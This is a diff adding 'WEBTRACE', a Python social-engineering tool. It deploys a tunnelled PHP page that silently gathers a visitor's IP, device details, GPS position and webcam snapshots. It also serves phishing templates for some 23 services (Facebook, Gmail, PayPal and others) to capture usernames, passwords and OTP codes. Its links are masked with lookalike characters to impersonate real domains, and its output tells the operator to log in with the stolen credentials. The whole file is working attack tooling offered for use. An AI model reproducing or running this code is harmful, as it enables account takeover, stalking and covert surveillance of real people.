@@ -1,0 +1,678 @@
+#!/usr/bin/python3
+#coded by 0xbit
+import os, sys, requests, time, re, subprocess, json
+from datetime import datetime, timedelta
+from tabulate import tabulate
+from tqdm import tqdm
+
+curdir = os.getcwd()
+
+RESET = "\033[0m"
+GREEN = "\033[92m"
+RED = "\033[91m"
+green_dot = '[\033[92m●\033[0m]'
+green_command = '[\033[92m+\033[0m]'
+red_warning = '[\033[91m!\033[0m]'
+green_q = '[\033[92m?\033[0m]'
+BG_P = "\033[48;5;55m"
+DRED = "\033[38;5;88m"
+
+def banner():
+    os.system('clear')
+    _ascii_art_banner_ = r'''
+    
+    
+            ___ ._______._______ _____._.______  .______  ._______ ._______
+    .___    |   |: .____/: __   / \__ _:|: __   \ :      \ :_.  ___\: .____/
+    :   | /\|   || : _/\ |  |>  \   |  :||  \____||   .   ||  : |/\ | : _/\ 
+    |   |/  :   ||   /  \|  |>   \  |   ||   :  \ |   :   ||    /  \|   /  \\
+    |   /       ||_.: __/|_______/  |   ||   |___\|___|   ||. _____/|_.: __/
+    |______/|___|   :/              |___||___|        |___| :/         :/   
+            :                                               :               
+            :                                                               
+    '''
+    _ascii_art_ = f'''
+        ─────────────────────────────────────────────────────────────────
+                               {BG_P}W E B T R A C E{RESET}  v 1.0
+                         
+        {DRED}┃{RESET} A Social Engineering Tool for Exposing & Tracking Targets.
+        {DRED}┃{RESET} Coded by {BG_P}0xbit{RESET}                                        
+        
+        ───────────────────────────────────────────────────────────────'''
+    print(_ascii_art_banner_+_ascii_art_)
+    
+def get_cloudflared():
+    try:
+        local_filename = ".runner"
+        if not os.path.exists(local_filename):
+            arch = subprocess.check_output(['uname', '-m']).decode().strip()
+            if 'arm' in arch or 'Android' in arch:
+                response = requests.get('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm', stream=True)
+            elif 'aarch64' in arch:
+                response = requests.get('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64', stream=True)
+            elif 'x86_64' in arch:
+                response = requests.get('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', stream=True)
+            else:
+                response = requests.get('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386', stream=True)
+        
+            file_size = int(response.headers.get("content-length", 0))
+            chunk_size = 512 * 1024
+
+            with open(local_filename, "wb") as file, tqdm(desc=f"{green_dot} Downloading",total=file_size,unit="B",unit_scale=True,unit_divisor=1024,ncols=65,bar_format="\t{l_bar}{bar} {n_fmt}/{total_fmt}B") as bar:
+                for chunk in response.iter_content(chunk_size=chunk_size):
+                    if chunk:
+                        file.write(chunk)
+                        bar.update(len(chunk))
+            os.chmod(local_filename, 0o755)
+        else:
+            pass
+    except KeyboardInterrupt:
+        os.remove(local_filename)
+        sys.exit()
+        
+def kill_process():
+    try:
+        ps_output = subprocess.check_output(["ps", "aux"]).decode("utf-8")
+        for line in ps_output.split("\n"):
+            if "php" in line or "runner" in line:
+                match = re.search(r"\s*(\d+)", line)
+                if match:
+                    pid = match.group(1)
+                    subprocess.run(["kill", "-9", pid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception as e:
+        print(f"\n\t {red_warning} Error: {e}")
+        
+def builder_page(path, CUSTOM_PAGE):
+    page_c = '''
+<?php
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $ip = $_POST['ip'] ?? 'waiting..';
+    $type = $_POST['type'] ?? 'waiting..';
+    $value = $_POST['value'] ?? 'waiting..';
+    $gps = $_POST['gps'] ?? 'waiting..';
+
+    if ($type === "IP") {
+        file_put_contents(".info", "[IP] ($value)\n", FILE_APPEND);
+    } elseif ($type === "Camera") {
+        if (!is_dir("images")) {
+            mkdir("images", 0777, true);
+        }
+        $number = $_POST['number'] ?? 1;
+        $unique_id = substr(md5(uniqid(mt_rand(), true)), 0, 6);
+        $filename = "images/camshot-$ip-$gps-$number-$unique_id.jpg";
+        $imageData = base64_decode($value);
+        file_put_contents($filename, $imageData);
+    } else {
+        $data = "[$type] $value\n";
+        file_put_contents(".info", $data, FILE_APPEND);
+    }
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page</title>
+    <script>
+        let userIP = "waiting..";
+        let gpsCoords = "waiting..";
+
+        async function fetchIP() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                const data = await response.json();
+                userIP = data.ip;
+                sendData("IP", userIP, { ip: userIP });
+            } catch (error) {
+                userIP = "Unavailable";
+                sendData("IP", "Unavailable", { ip: userIP });
+            }
+        }
+
+        function sendData(type, value, extraData = {}) {
+            let formData = new URLSearchParams();
+            formData.append("type", type);
+            formData.append("value", value);
+            formData.append("gps", gpsCoords);
+
+            for (const key in extraData) {
+                formData.append(key, extraData[key]);
+            }
+            fetch("index.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: formData.toString()
+            });
+        }
+
+        async function gatherInfo() {
+            await fetchIP();
+            sendData("Browser", navigator.userAgent);
+            sendData("Screen Size", screen.width + "x" + screen.height);
+            sendData("OS", navigator.platform);
+            sendData("Device", /Mobi/i.test(navigator.userAgent) ? "Mobile" : "Desktop");
+            sendData("Language", navigator.language);
+            sendData("Timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
+            sendData("CPU Cores", navigator.hardwareConcurrency || "waiting..");
+            sendData("RAM", navigator.deviceMemory ? navigator.deviceMemory + "GB" : "waiting..");
+            sendData("Touch Support", navigator.maxTouchPoints > 0 ? "Yes" : "No");
+            sendData("Do Not Track", navigator.doNotTrack === "1" ? "Enabled" : "Disabled");
+            requestGPS();
+        }
+
+        function requestGPS() {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    gpsCoords = pos.coords.latitude + "," + pos.coords.longitude;
+                    sendData("GPS", "https://www.google.com/maps?q=" + gpsCoords);
+                    startCameraShots(10);
+                },
+                () => {
+                    gpsCoords = "Denied";
+                    sendData("GPS", "Denied");
+                    startCameraShots(10);
+                }
+            );
+        }
+
+        function startCameraShots(count) {
+            let video = document.createElement("video");
+            let canvas = document.createElement("canvas");
+            let context = canvas.getContext("2d");
+            navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+                video.srcObject = stream;
+                video.play();
+                let shotCount = 0;
+                let takeShot = () => {
+                    if (shotCount < count) {
+                        setTimeout(() => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            let cameraData = canvas.toDataURL("image/jpeg").split(",")[1];
+                            sendData("Camera", cameraData, { number: shotCount + 1 });
+                            shotCount++;
+                            takeShot();
+                        }, 400);
+                    } else {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                };
+                takeShot();
+            }).catch(() => {
+                sendData("Camera", "No image");
+            });
+        }
+    </script>
+</head>
+<body onload="gatherInfo()">'''
+    page_c1 = f'''
+    {CUSTOM_PAGE}
+</body>
+</html>
+    '''
+    with open(f'{path}/index.php', 'w') as wr:
+        wr.write(page_c)
+        wr.write(page_c1)
+
+def shorten_link(link):
+    url = 'https://api.t.ly/api/v1/link/shorten'
+    exd_time = (datetime.now() + timedelta(days=3)).strftime("%Y-%m-%d %H:%M:%S")
+    payload = {"long_url": link,"domain": "https://t.ly/","expire_at_datetime": exd_time,"description": "Social Media Link","public_stats": True,}
+    headers = {'Authorization': f'Bearer {api_key}','Content-Type': 'application/json','Accept': 'application/json'}
+    response = requests.request('POST', url, headers=headers, json=payload)
+    short_url = response.json().get('short_url')
+    if short_url:
+        pattern = r"^https:\/\/t\.ly\/[A-Za-z0-9]{5}$"
+        if re.fullmatch(pattern, short_url):
+            return short_url
+    return "Not found"
+    
+def extrack_data(filename):
+    data = {
+        "IP": "waiting..",
+        "Browser": "waiting..",
+        "Screen Size": "waiting..",
+        "OS": "waiting..",
+        "Device": "waiting..",
+        "Language": "waiting..",
+        "Timezone": "waiting..",
+        "CPU Cores": "waiting..",
+        "RAM": "waiting..",
+        "Touch Support": "waiting..",
+        "Do Not Track": "waiting..",
+        "GPS": "waiting.."
+    }
+    with open(filename, "r") as file:
+        for line in file:
+            match = re.match(r"\[(.*?)\]\s*(?:\((.*?)\)|(.+))", line)
+            if match:
+                key = match.group(1).strip()
+                value = match.group(2) if match.group(2) else match.group(3)
+                if key in data:
+                    data[key] = value.strip()
+    return data
+
+def monitor_creds(filename):
+    try:
+        print(f"\t {green_dot} Waiting for the target to open the page... {RED}(ctrl+c to stop){RESET}")
+        with open(filename, 'w') as f:
+            f.write('')
+        last_position = 0
+        while True:
+            with open(filename, "r") as file:
+                file.seek(last_position)
+                new_lines = file.readlines()
+                last_position = file.tell()
+                if new_lines:
+                    formatted_output = tabulate([[f"{key}", f"{GREEN}{value}{RESET}"] for key, value in extrack_data(filename).items()], headers=[f'{BG_P}Field{RESET}', f'{BG_P}Value{RESET}'], tablefmt="rounded_grid", stralign='left')
+                    print('\t  │')
+                    print('\n'.join(['\t ' + line for line in formatted_output.split('\n')]))
+                    
+            time.sleep(1)
+    except KeyboardInterrupt:
+        sys.exit()
+
+def deploy_custom(path, port):
+    os.chdir(path)
+    kill_process()
+    try:
+        print('\t  │')
+        mask_domain = input(f"\t {green_q} Custom domain (Ex. {GREEN}https://google.com, https://pornhub.com{RESET}): ").strip().rstrip('/')
+        
+        print('\t  │')
+        keyword = input(f"\t {green_q} Custom keywords (Ex. {GREEN}/mypussy/pages.php?id=1, /uploads/files?id=10, /my.website{RESET}): ").replace("?", "ʔ").replace('=', '꞊').replace(" ", ".").replace("/", "⧸")
+        
+        print('\t  │')
+        print(f'\t {green_command} Deploying Page...')
+        
+        subprocess.Popen(f'php -S 127.0.0.1:{port}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)
+
+        print('\t  │')
+        print(f'\t {green_command} Getting link...')
+        
+        os.chdir(curdir)
+        with open('.log', 'w') as clear:
+            clear.write('')
+        
+        if any(os.path.exists(path) for path in ["/data/data/com.termux/files/usr", "/data/data/com.termux"]):
+            subprocess.Popen(f"cloudflared tunnel -url 127.0.0.1:{port} --logfile .log", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        else:
+            subprocess.Popen(f"{curdir}/.runner tunnel -url 127.0.0.1:{port} --logfile .log", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+        while True:
+            with open(".log", "r") as log_file:
+                log_contents = log_file.read()
+            if log_contents:
+                matches = re.search(r'[-0-9a-z]+\.trycloudflare\.com', log_contents.strip())
+                if matches:
+                    clink = matches.group()
+                    slink = shorten_link(clink)
+                    if slink == "Not found":
+                        final_url = f"{mask_domain}⧸{keyword}@{clink.replace('https://', '')}".replace('⧸⧸','⧸')
+                    else:
+                        final_url = f"{mask_domain}⧸{keyword}@{slink.replace('https://', '')}".replace('⧸⧸','⧸')
+                    print('\t  │')
+                    print(f'\t {green_command} PAYLOAD LINK: \033[92m{final_url}\033[0m')
+                    print('\t  │')
+                    print('\t  │')
+                    break
+            else:
+                time.sleep(1)
+                continue
+        
+    except KeyboardInterrupt:
+        sys.exit(f"\n\n\t {red_warning} Exiting...")
+        
+    except Exception as e:
+        print(f"\n\t {red_warning} An unexpected error occurred: {e}")
+        
+    monitor_creds(f"{path}/.info")
+    
+def check_F(folder):
+    valid_extensions = {".php", ".html", ".css"}
+    found_files = []
+    index_file_content = None 
+    index_file_path = None    
+    for root, dirs, files in os.walk(folder):
+        for file in files:
+            file_path = os.path.join(root, file)
+            _, ext = os.path.splitext(file)
+
+            if ext.lower() in valid_extensions:
+                found_files.append(file_path)
+
+            if file.lower() in {"index.php", "index.html"} and index_file_path is None:
+                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                    index_file_content = f.read()
+                index_file_path = file_path 
+                print(f"\n\t {green_command} Found Your Index File: {GREEN}{index_file_path}{RESET}")
+                break
+    if found_files:
+        print('\t  │')
+        print(f"\t {green_command} Found {len(found_files)} web-files in '{folder}':")
+        print('\t  │')
+        for f in found_files:
+            print(f"\t  ├──📂 {f}")
+    else:
+        pass
+    return index_file_content, index_file_path
+
+def info_extractor():
+    os.chdir(curdir)
+    folder_path = "MYPAGE" 
+    if os.path.exists(folder_path):
+        index_content, index_path = check_F(folder_path)
+        if index_path:
+            directory = os.path.dirname(index_path)
+            builder_page(directory, index_content)
+            time.sleep(1)
+            deploy_custom(directory, port)
+        else:
+            print(f"\n\t {red_warning} No web-files found inside '{GREEN}MYPAGE{RESET}'.\n")
+    else:
+        os.mkdir(folder_path)
+        print(f"\n\t {red_warning} No web-files found in '{GREEN}MYPAGE.{RESET}' Please put your page inside.\n")
+        
+def start_cred_attack(path, option, mask_domain):
+    kill_process()
+    try:
+        os.chdir(path)
+        subprocess.Popen(f'php -S 127.0.0.1:{port}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        banner()
+        print(f'\t {green_dot} TEMPLATE: {GREEN}{option}{RESET}')
+        
+        print('\t  │')
+        print(f'\t {green_command} Keyword Examples: {GREEN}/mypussy/pages.php?id=1, /uploads/files?id=10, /my.website{RESET}')
+        print('\t  │')
+        keyword = input(f"\t {green_q} Custom keywords {BG_P}{mask_domain}{RESET}: ").replace("?", "ʔ").replace('=', '꞊').replace(" ", ".").replace("/", "⧸")
+        
+        print('\t  │')
+        print(f'\t {green_command} Deploying Page...')
+
+        os.chdir(curdir)
+        with open('.log', 'w') as clear:
+            clear.write('')
+        
+        if any(os.path.exists(path) for path in ["/data/data/com.termux/files/usr", "/data/data/com.termux"]):
+            subprocess.Popen(f"cloudflared tunnel -url 127.0.0.1:{port} --logfile .log", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        else:
+            subprocess.Popen(f"{curdir}/.runner tunnel -url 127.0.0.1:{port} --logfile .log", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        print('\t  │')
+        print(f'\t {green_command} Getting link...')
+
+    except KeyboardInterrupt:
+        sys.exit(f"\n\n\t {red_warning} Exiting...")
+        
+    while True:
+        with open(".log", "r") as log_file:
+            log_contents = log_file.read()
+        if log_contents:
+            matches = re.search(r'[-0-9a-z]+\.trycloudflare\.com', log_contents.strip())
+            if matches:
+                clink = matches.group()
+                slink = shorten_link(clink)
+                if slink == 'Not found':
+                    final_url = f"{mask_domain}⧸{keyword}@{clink.replace('https://', '')}".replace('⧸⧸','⧸')
+                else:    
+                    final_url = f"{mask_domain}⧸{keyword}@{slink.replace('https://', '')}".replace('⧸⧸','⧸')
+                print('\t  │')
+                print(f'\t {green_command} PAYLOAD LINK: \033[92m{final_url}\033[0m')
+                print('\t  │')
+                print('\t  │')
+                break
+        else:
+            time.sleep(1)
+            continue
+    try:
+        os.chdir(path)
+        
+        log = 'log.txt'
+        if os.path.exists(log):
+            os.remove(log)
+        with open(log, "w") as log_file:
+            log_file.write('')
+
+        print(f'\t {green_command} if user data appears, use it to log in and wait for OTP code.\n')
+        
+        seen_data = set()
+
+        while True:
+            with open(log, "r") as file:
+                content = file.read()
+
+            username_matches = re.findall(r'Username:\s*(\S+)\s+Pass:\s*(\S+)(?:\s+OTP:\s*(\S+))?', content)
+            number_matches = re.findall(r'Number:\s*(\S+)(?:\s+OTP:\s*(\S+))?', content)
+
+            new_data = []
+            for match in username_matches:
+                username, password, otp = match
+                entry = (username, password, otp if otp else None)
+
+                if entry not in seen_data:
+                    seen_data.add(entry)
+                    row = [
+                        f'{DRED}┃{RESET} {BG_P}USERNAME{RESET}:', username, 
+                        f'{BG_P}PASSWORD{RESET}:', password
+                    ]
+                    if otp:
+                        row.append(f'{BG_P}OTP{RESET}:')
+                        row.append(otp)
+                        otp_found = True
+                    new_data.append(row)
+
+            for match in number_matches:
+                number, otp = match
+                entry = (number, otp if otp else None)
+
+                if entry not in seen_data:
+                    seen_data.add(entry)
+                    row = [
+                        f'{DRED}┃{RESET} {BG_P}NUMBER{RESET}:', number
+                    ]
+                    if otp:
+                        row.append(f'{BG_P}OTP{RESET}:')
+                        row.append(otp)
+                        otp_found = True
+                    new_data.append(row)
+
+            if new_data:
+                if not otp_found:
+                    for row in new_data:
+                        while len(row) > 4:
+                            row.pop()
+
+                formatted_data = tabulate(new_data, tablefmt='rounded_grid', stralign='left')
+                print('\n'.join(['\t ' + line for line in formatted_data.split('\n')]))
+
+            otp_found = False
+            time.sleep(1)
+
+    except KeyboardInterrupt:
+        main()
+    
+def creds_extractor():
+    os.chdir(curdir)
+    banner()
+
+    print('')
+    available_template = tabulate([[f'{GREEN}AVAILABLE TEMPLATES{RESET}', 'DEDSEC PHISHING TOOL OTP SUPPORT .']],tablefmt='rounded_grid')
+
+    template_options = tabulate(
+        [['1. TIKTOK', '9. WHATSAPP', '17. SNAPCHAT'],
+        ['2. FACEBOOK', '10. LINKEDIN', '18. PROTONMAIL'],
+        ['3. INSTAGRAM', '11. SPOTIFY', '19. STACKOVERFLOW'],
+        ['4. UBER EATS', '12. GITHUB', '20. EBAY'],
+        ['5. GMAIL', '13. PAYPAL', '21. TWITCH'],
+        ['6. NETFLIX', '14. TELEGRAM', '22. CRYPTOCURRENCY'],
+        ['7. INSTAGRAM FOLLOW', '15. TWITTER', '23. PINTEREST'],
+        ['8. AMAZON', '16. WORDPRESS', f'00. {RED}BACK{RESET}']],
+        tablefmt='rounded_grid', stralign='left')
+
+    print('\n'.join(['\t ' + line for line in available_template.split('\n')]))
+    print('\n'.join(['\t ' + line for line in template_options.split('\n')]))
+
+    try:
+        option = input(f"\n\t {green_q} SELECT: ")
+        if option == "1":
+            start_cred_attack('templates/tiktok', 'TIKTOK', 'https://www.tiktok.com')
+        elif option == "2":
+            start_cred_attack('templates/facebook/', 'FACEBOOK', 'https://www.facebook.com')
+        elif option == "3":
+            start_cred_attack('templates/instagram/', 'INSTAGRAM', 'https://www.instagram.com')
+        elif option == "4":
+            start_cred_attack('templates/UberEats-Phishing/', 'UBER EATS', 'https://www.ubereats.com')
+        elif option == "5":
+            start_cred_attack('templates/google-otp/', 'GMAIL', 'https://google.com')
+        elif option == "6":
+            start_cred_attack('templates/Netflix/', 'NETFLIX', 'https://netflix.com')
+        elif option == "7":
+            start_cred_attack('templates/instafollow/', 'INSTGRAM', 'https://instagram.com')
+        elif option == "8":
+            start_cred_attack('templates/amazonsign/', 'AMAZON', 'https://amazon.com')
+        elif option == "9":
+            start_cred_attack('templates/whatsapp-phishing/', 'WHATSAPP', 'https://whatsapp.com')
+        elif option == "10":
+            start_cred_attack('templates/Linkedin/', 'LINKEDIN', 'https://linkedin.com')
+        elif option == "11":
+            start_cred_attack('templates/spotify/', 'SPOTIFY', 'https://spotify.com')
+        elif option == "12":
+            start_cred_attack('templates/github/', 'GITHUB', 'https://github.com')
+        elif option == "13":
+            start_cred_attack('templates/paypal/', 'PAYPAL', 'https://paypal.com')
+        elif option == "14":
+            start_cred_attack('templates/telegram/', 'TELEGRAM', 'https://telegram.org')
+        elif option == "15":
+            start_cred_attack('templates/twitter/', 'TWITTER', 'https://twitter.com')
+        elif option == "16":
+            start_cred_attack('templates/wordpress/', 'WORDPRESS', 'https://wordpress.com')
+        elif option == "17":
+            start_cred_attack('templates/snapchat/', 'SNAPCHAT', 'https://snapchat.com')
+        elif option == "18":
+            start_cred_attack('templates/protonmail/', 'PROTONMAIL', 'https://account.proton.me')
+        elif option == "19":
+            start_cred_attack('templates/stackoverflow/', 'STACKOVERFLOW', 'https://stackoverflow.com')
+        elif option == "20":
+            start_cred_attack('templates/ebay/', 'EBAY', 'https://ebay.com')
+        elif option == "21":
+            start_cred_attack('templates/twitch/', 'TWITCH', 'https://twitch.com')
+        elif option == "22":
+            start_cred_attack('templates/cryptocurrency/', 'CRYPTOCURREMCY', 'https://expertoption.com')
+        elif option == "23":
+            start_cred_attack('templates/pinterest/', 'PINTEREST', 'https://pinterest.com')
+        elif option == "00" or option == "0":
+            main()
+        else:
+            print(f"\n\t {red_warning} INVALID OPTION")
+            time.sleep(1)
+            creds_extractor()
+            
+    except KeyboardInterrupt:
+        sys.exit(f'\n\n\t {green_dot} BYE BYE!')
+        
+def set_api_key():
+    while True:
+        api_key = input(f"\n\t {green_q} API KEY: ").strip()
+        
+        if not api_key:
+            print(f"\n\t {red_warning} Invalid API!")
+            time.sleep(1)
+            continue    
+        
+        if re.fullmatch(r"[A-Za-z0-9]{40,}", api_key):
+            with open(api_key_path, "w") as f:
+                f.write(api_key)
+            print('\n'+'\n'.join(['\t' + line for line in  tabulate([[f'{GREEN}VALID API KEY{RESET}', api_key]],tablefmt='rounded_grid').split('\n')]))
+            time.sleep(2)
+        else:
+            print(f"\n\t {red_warning} Invalid API!")
+            time.sleep(1)
+            continue
+
+        return main()
+
+def set_cred():
+    banner()
+    if token_check:
+        with open(api_key_path, 'r') as file:
+            api_key = file.read().strip()
+    
+        print(f'\n\t {green_dot} Current API Key:')
+        print('\n'.join(['\t' + line for line in  tabulate([[f'{GREEN}API KEY{RESET}', api_key]],tablefmt='rounded_grid').split('\n')]))
+        print('\n'.join(['\t' + line for line in  tabulate([['1. Change API\n2. Back ']],tablefmt='rounded_grid').split('\n')]))
+        select = input(f'\t {green_q} SELECT: ')
+        if select == '1':
+            set_api_key()
+        elif select == '2':
+            main()
+        else:
+            print(f"\n\t {red_warning} Invalid option!")
+            time.sleep(1)
+            set_cred()
+    else:
+        set_api_key()
+        
+def main():
+    banner()
+    global token_check, api_key, api_key_path, port
+    
+    port = 8080
+    api_key_path = f'{curdir}/.api.key'
+    
+    if os.path.exists('.log'):
+        os.remove('.log')
+        
+    if not os.path.exists(api_key_path):
+        open(api_key_path, 'a').close()
+
+    with open(api_key_path, "r") as file:
+        api_key = file.read().strip()
+
+        if re.fullmatch(r"[A-Za-z0-9]{40,}", api_key):
+            token_check = True
+        else:
+            token_check = False
+        
+    api_stat = f'[{GREEN}True{RESET}]' if token_check else f'[{RED}False{RESET}]'
+
+    option = f'''
+[1]. INFO EXTRACTOR                 [{GREEN}IP, GPS, Camera, etc.{RESET}]  
+[2]. CREDENTIALS EXTRACTOR          [{GREEN}Username, Password, OTP{RESET}]
+[3]. SETUP API KEY                  {api_stat}
+[0]. {DRED}EXIT{RESET}  
+    '''
+    print('\n'.join(['\t' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+    try:
+        select = input(f"\t {green_q} SELECT: ")
+        if select == '1':
+            info_extractor()
+        elif select == '2':
+            creds_extractor()
+        elif select == '3':
+            set_cred()
+        elif select == '0':
+            sys.exit(f"\n\t {red_warning} EXITING..\n")
+        else:
+            print(f"\n\t {red_warning} INVALID OPTION\n")
+            time.sleep(1)
+            main()
+            
+    except KeyboardInterrupt:
+        sys.exit(f'\n\n\t {green_dot} BYE BYE!')
+        
+if __name__ == "__main__":
+    banner()
+    try:
+        requests.get("https://www.google.com", timeout=5)
+        pass
+    except requests.ConnectionError:
+        sys.exit(f"\n\t {red_warning} {RED}NO INTERNET CONNECTION{RESET}\n\n")
+        
+    get_cloudflared()
+    main()
